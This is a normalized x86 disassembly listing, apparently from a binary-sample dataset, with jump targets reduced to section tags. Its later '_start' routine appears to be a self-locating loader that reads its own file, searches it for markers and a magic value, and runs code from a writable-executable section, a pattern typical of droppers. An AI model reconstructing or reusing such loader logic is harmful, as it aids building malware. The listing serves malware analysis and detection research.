jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_4268a2
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_426930
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_4269d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_4268a2
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_426930
push eax
mov [ ebp - 0xc ] eax
call sub_426f0f
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_426ce0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_426d41
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_426f0f
push 0x8
push r--data
call sub_4183f0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_418435
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_44f27d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_44fe90
add esp 0x4
call sub_450050
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_450080
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_450080
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_44fe90
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_44fe90
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_44fe90
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
